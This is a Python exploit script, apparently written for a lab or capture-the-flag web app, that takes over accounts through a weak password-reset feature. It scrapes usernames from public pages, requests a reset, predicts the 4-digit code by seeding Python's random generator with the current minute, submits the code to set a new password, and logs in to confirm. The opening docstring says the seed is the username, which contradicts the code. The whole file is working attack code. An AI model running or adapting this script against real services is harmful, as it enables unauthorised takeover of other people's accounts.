#!/usr/bin/env python3
"""
Exploit for predictable PRNG vulnerability in password reset functionality.
The application generates reset codes using username as seed, making them predictable.
"""
import requests
import random
import hashlib
import sys

def generate_time_based_code(time_offset=0):
    """Generate code based on current minute (same as server)"""
    import time
    
    # Use current minute as seed for predictable RNG
    current_minute = int(time.time() // 60) + time_offset
    rng = random.Random()
    rng.seed(current_minute)
    
    # Generate 4-digit code (same logic as server)
    code = str(rng.randint(1000, 9999)).zfill(4)
    return code

def exploit_prng_vulnerability(target_url, target_username, new_password):
    """
    Exploit the predictable PRNG vulnerability to reset a user's password.
    """
    print(f"[*] Starting PRNG exploit for user: {target_username}")
    print(f"[*] Target: {target_url}")
    
    session = requests.Session()
    
    # Step 1: Trigger password reset request
    print("[*] Step 1: Triggering password reset...")
    reset_data = {"username": target_username}
    r_reset = session.post(f"{target_url}/forgot_password", data=reset_data)
    
    if r_reset.status_code != 200:
        print(f"[-] Failed to trigger password reset. Status: {r_reset.status_code}")
        return False
    
    if "password reset code has been generated" not in r_reset.text:
        print("[-] Password reset failed - user might not exist")
        return False
    
    print("[+] Password reset triggered successfully")
    
    # Step 2: Generate possible codes based on current minute
    print("[*] Step 2: Generating possible reset codes...")
    possible_codes = []
    
    # Try current minute and previous minute (in case reset was triggered in previous minute)
    for offset in [0, -1]:
        code = generate_time_based_code(offset)
        possible_codes.append((offset, code))
        print(f"    Minute {offset}: {code}")
    
    # Step 3: Try each possible code
    print("[*] Step 3: Attempting password reset with generated codes...")
    
    for offset, code in possible_codes:
        print(f"[*] Trying code {code} (minute {offset})...")
        
        reset_data = {
            "code": code,
            "new_password": new_password
        }
        
        r_reset_attempt = session.post(
            f"{target_url}/reset_password/{target_username}",
            data=reset_data,
            allow_redirects=False
        )
        
        # Check if password reset was successful (302 redirect to login)
        if r_reset_attempt.status_code == 302 and "/login" in r_reset_attempt.headers.get("Location", ""):
            print(f"[+] SUCCESS! Password reset with code: {code}")
            print(f"[+] User '{target_username}' password changed to: {new_password}")
            
            # Step 4: Verify by logging in with new password
            print("[*] Step 4: Verifying exploit by logging in...")
            login_data = {
                "username": target_username,
                "password": new_password
            }
            
            r_login = session.post(f"{target_url}/login", data=login_data, allow_redirects=False)
            
            if r_login.status_code == 302 and "/" in r_login.headers.get("Location", ""):
                print("[+] EXPLOIT SUCCESSFUL! Login confirmed with new password")
                return True
            else:
                print("[-] Login failed - exploit may not have worked")
                return False
    
    print("[-] All codes failed. Exploit unsuccessful.")
    return False

def discover_usernames(target_url):
    """
    Helper function to discover usernames from the application.
    This checks the timeline for public posts to find usernames.
    """
    print("[*] Attempting to discover usernames...")
    
    try:
        session = requests.Session()
        
        # Try to access timeline without login (might show some content)
        r = session.get(target_url)
        
        # Look for usernames in the HTML
        import re
        usernames = re.findall(r'<strong>([^<]+)</strong>', r.text)
        
        if usernames:
            print(f"[+] Found potential usernames: {list(set(usernames))}")
            return list(set(usernames))
        else:
            print("[-] No usernames found on public pages")
            return []
            
    except Exception as e:
        print(f"[-] Error discovering usernames: {e}")
        return []

def main():
    if len(sys.argv) < 2:
        print("Usage: python exploit_prng.py <target_url> [username]")
        print("Example: python exploit_prng.py http://127.0.0.1:5000 admin")
        print()
        print("If no username provided, will attempt to discover usernames")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    new_password = 'exploited_password_123'
    
    if len(sys.argv) >= 3:
        target_username = sys.argv[2]
    else:
        # Try to discover usernames
        usernames = discover_usernames(target_url)
        if not usernames:
            print("[-] No usernames discovered. Please provide a username manually.")
            sys.exit(1)
        target_username = usernames[0]  # Use first found username
        print(f"[*] Using discovered username: {target_username}")
    
    print(f"[*] Target URL: {target_url}")
    print(f"[*] Target User: {target_username}")
    print(f"[*] New Password: {new_password}")
    print()
    
    success = exploit_prng_vulnerability(target_url, target_username, new_password)
    
    if success:
        print()
        print("=" * 50)
        print("EXPLOIT SUCCESSFUL!")
        print(f"Username: {target_username}")
        print(f"New Password: {new_password}")
        print("=" * 50)
    else:
        print()
        print("Exploit failed. Possible reasons:")
        print("1. User doesn't exist")
        print("2. User hasn't logged in yet (RNG state unknown)")
        print("3. Application patched")

if __name__ == "__main__":
    main()